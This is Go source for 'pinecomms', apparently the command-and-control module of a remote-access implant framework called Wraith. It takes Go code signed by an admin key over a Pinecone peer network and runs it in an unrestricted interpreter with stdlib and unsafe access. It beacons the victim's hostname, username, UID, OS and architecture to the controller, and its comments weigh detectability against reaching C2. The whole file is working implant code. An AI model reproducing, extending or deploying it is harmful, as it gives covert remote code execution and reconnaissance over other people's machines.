package wraithmodulepinecomms

import (
	"bytes"
	"context"
	"crypto/ed25519"
	"encoding/hex"
	"fmt"
	"math/rand"
	"net/http"
	"os"
	"os/user"
	"reflect"
	"runtime"
	"sync"
	"time"

	"dev.l1qu1d.net/wraith-labs/wraith-module-pinecomms/internal/proto"
	"dev.l1qu1d.net/wraith-labs/wraith-module-pinecomms/internal/radio"
	"dev.l1qu1d.net/wraith-labs/wraith-module-pinecomms/internal/symbols"
	"dev.l1qu1d.net/wraith-labs/wraith/libwraith"
	"github.com/traefik/yaegi/interp"
	"github.com/traefik/yaegi/stdlib"
	"github.com/traefik/yaegi/stdlib/unsafe"
)

const (
	MOD_NAME = "w.pinecomms"

	SHM_ERRORS = "w.errors"
)

// A comms module implementation which utilises signed Go source code messages
// as a base for its commands. This allows great versatility while maintaining
// security with verification on both sides. This module is meant as a simple
// default which does a good job in most usecases.
// The underlying protocol is [TCP / WS / ... ] > Pinecone > HTTP > CBOR Structs.
type ModulePinecomms struct {
	mutex sync.Mutex

	// Configuration properties

	// The private key that should be used for this instance of Wraith on
	// the pinecone network. This MUST NOT be hardcoded and MUST instead
	// be generated at runtime to prevent clashes. The key is an argument
	// to allow for various generators.
	OwnPrivKey ed25519.PrivateKey

	// This value solely decides who has control over this Wraith. The owner
	// of the matching private key will be able to instruct this Wraith to
	// do anything.
	AdminPubKey ed25519.PublicKey

	// Which address (if any) the Wraith should listen on for raw TCP pinecone
	// connections. Setting this makes the Wraith more detectable but might
	// improve its chances of successfully connecting to C2.
	ListenTcp string

	// Which address (if any) the Wraith should listen on for websocket pinecone
	// connections. Setting this makes the Wraith more detectable but might
	// improve its chances of successfully connecting to C2.
	ListenWs string

	// Whether or not the Wraith should use multicast to find other Wraiths on
	// the local network. Setting this makes the Wraith more detectable but might
	// improve its chances of successfully connecting to C2.
	UseMulticast bool

	// Which pinecone peers (if any) the Wraith should immediately connect to on
	// startup. Note that leaving this blank makes it very difficult for commands
	// to reach your Wraith. On the other hand, more peers means more network traffic
	// and higher chances of detection.
	StaticPeers []string

	// What additional libraries should be available to the payloads.
	// See documentation on `yaegi extract`.
	AdditionalSymbols map[string]map[string]reflect.Value
}

func (m *ModulePinecomms) handleRequest(ctx context.Context, w *libwraith.Wraith, pr radio.Radio, packet proto.Packet) {

	//
	// Validate and process the packet.
	//

	peerPublicKey, err := hex.DecodeString(packet.Peer)
	if err != nil {
		// This shouldn't happen, but if the peer public key is
		// malformed then we have no choice but to ignore the
		// packet.
		return
	}

	if !bytes.Equal(peerPublicKey, m.AdminPubKey) {
		// This ensures that request packets are only accepted from
		// the c2. As packets are signed, eventually we may be able
		// to drop this check if we account for replay attacks. This
		// would allow for store-and-forward capability where new
		// Wraiths coming online will continue to execute commands
		// or load modules even if c2 is down.
		return
	}

	packetData := proto.PacketRR{}
	err = proto.Unmarshal(&packetData, m.AdminPubKey, packet.Data)
	if err != nil {
		// The packet data is malformed, there is nothing more we
		// can do.
		return
	}

	//
	// Execute the packet payload.
	//

	i := interp.New(interp.Options{
		Unrestricted: true,
	})

	moduleSymbols := map[string]map[string]reflect.Value{
		"wmp/module/module": {
			"ModulePinecomms": reflect.ValueOf((*ModulePinecomms)(nil)),
		},
	}

	i.Use(moduleSymbols)
	i.Use(symbols.SymbolsLibwraith)
	i.Use(symbols.SymbolsProto)
	i.Use(stdlib.Symbols)
	i.Use(unsafe.Symbols)
	i.Use(m.AdditionalSymbols)

	var (
		response     []byte
		result       reflect.Value
		communicator func(*ModulePinecomms, *libwraith.Wraith) []byte
		ok           bool
	)

	_, err = i.Eval(string(packetData.Payload))
	if err != nil {
		response = []byte(fmt.Sprintf("could not evaluate due to error: %s", err.Error()))
		goto respond
	}

	result, err = i.Eval("main.Y")
	if err != nil {
		response = []byte(fmt.Sprintf("could not find `main.Y`: %s", err.Error()))
		goto respond
	}

	if !result.IsValid() {
		// The program didn't return anything for us to run, so assume everything
		// is done and notify the user.
		response = []byte("program did not return anything")
		goto respond
	}

	communicator, ok = result.Interface().(func(*ModulePinecomms, *libwraith.Wraith) []byte)
	if !ok {
		response = []byte(fmt.Sprintf("returned function was of incorrect type (%T)", result.Interface()))
		goto respond
	}

	func() {
		defer func() {
			if err := recover(); err != nil {
				w.SHMSet(libwraith.SHM_ERRS, fmt.Errorf("command in request `%s` panicked: %e", packetData.TxId, err))
			}
		}()

		response = communicator(m, w)
	}()

	//
	// Respond to the packet.
	//

respond:
	responseData := proto.PacketRR{
		Payload: response,
		TxId:    packetData.TxId,
	}

	responseDataBytes, err := proto.Marshal(&responseData, m.OwnPrivKey)
	if err != nil {
		// There is no point sending anything because the TxId is included
		// in the responseData and without it, c2 won't know what the response
		// is to.
		w.SHMSet(libwraith.SHM_ERRS, fmt.Errorf("marshalling response to `%s` failed: %e", packetData.TxId, err))
		return
	}

	pr.Send(ctx, proto.Packet{
		Peer:   packet.Peer,
		Method: http.MethodPost,
		Route:  proto.ROUTE_RR,
		Data:   responseDataBytes,
	})
}

func (m *ModulePinecomms) Mainloop(ctx context.Context, w *libwraith.Wraith) {
	// Ensure this instance is only started once and mark as running if so.
	single := m.mutex.TryLock()
	if !single {
		panic(fmt.Errorf("%s already running", MOD_NAME))
	}
	defer m.mutex.Unlock()

	// Make sure keys are valid.
	if keylen := len(m.OwnPrivKey); keylen != ed25519.PrivateKeySize {
		panic(fmt.Errorf("[%s] incorrect private key size (is %d, should be %d)", MOD_NAME, keylen, ed25519.PublicKeySize))
	}
	if keylen := len(m.AdminPubKey); keylen != ed25519.PublicKeySize {
		panic(fmt.Errorf("[%s] incorrect public key size (is %d, should be %d)", MOD_NAME, keylen, ed25519.PublicKeySize))
	}

	// Get a struct for managing pinecone connections.
	pr := radio.GetInstance()

	//
	// Configure pinecone manager.
	//

	pr.SetPineconeIdentity(m.OwnPrivKey)
	pr.SetInboundAddr(m.ListenTcp)
	pr.SetWebserverAddr(m.ListenWs)
	pr.SetUseMulticast(m.UseMulticast)
	pr.SetStaticPeers(m.StaticPeers)

	// Start the pinecone manager and make sure it stops when
	// the module does.
	defer func() {
		pr.Stop()
	}()
	go pr.Start()

	//
	// Run the module.
	//

	// Heartbeat loop.
	go func() {
		// Cache some values used in the heartbeat.

		strain := w.GetStrainId()
		initTime := w.GetInitTime()
		hostname, err := os.Hostname()
		if err != nil {
			hostname = "<unknown>"
		}
		username := "<unknown>"
		userId := "<unknown>"
		currentUser, err := user.Current()
		if err == nil {
			username = currentUser.Username
			userId = currentUser.Uid
		}
		errs, _ := w.SHMGet(SHM_ERRORS).([]error)

		for {
			// Pick an interval between min and max for the next heartbeat.
			interval := proto.HEARTBEAT_INTERVAL_MIN + rand.Intn(
				proto.HEARTBEAT_INTERVAL_MAX-proto.HEARTBEAT_INTERVAL_MIN,
			)

			// Send heartbeat after interval or exit if requested.
			select {
			case <-ctx.Done():
				return
			case <-time.After(time.Duration(interval) * time.Second):
				// Build a heartbeat data packet.
				heartbeatData := proto.PacketHeartbeat{
					StrainId:   strain,
					InitTime:   initTime,
					Modules:    w.ModsGet(),
					HostOS:     runtime.GOOS,
					HostArch:   runtime.GOARCH,
					Hostname:   hostname,
					HostUser:   username,
					HostUserId: userId,
					Errors:     len(errs),
				}
				heartbeatBytes, err := proto.Marshal(&heartbeatData, m.OwnPrivKey)
				if err != nil {
					panic("error while marshaling heartbeat data, cannot continue: " + err.Error())
				}

				// Send the packet.
				pr.Send(ctx, proto.Packet{
					Peer:   hex.EncodeToString(m.AdminPubKey),
					Method: http.MethodPost,
					Route:  proto.ROUTE_HEARTBEAT,
					Data:   heartbeatBytes,
				})
			}
		}
	}()

	// Start receiving messages.
	// Background context is okay because the channel will be closed
	// when the manager exits further down anyway.
	recv := pr.RecvChan(context.Background())

	// Mainloop.
	for {
		select {
		// Trigger exit when requested.
		case <-ctx.Done():
			return
		// Process incoming packets.
		case packet := <-recv:
			switch packet.Route {
			case proto.ROUTE_RR:
				// Launch a goroutine to handle the request and issue a response.
				go m.handleRequest(ctx, w, pr, packet)
			}
		}
	}
}

// Return the name of this module.
func (m *ModulePinecomms) WraithModuleName() string {
	return MOD_NAME
}
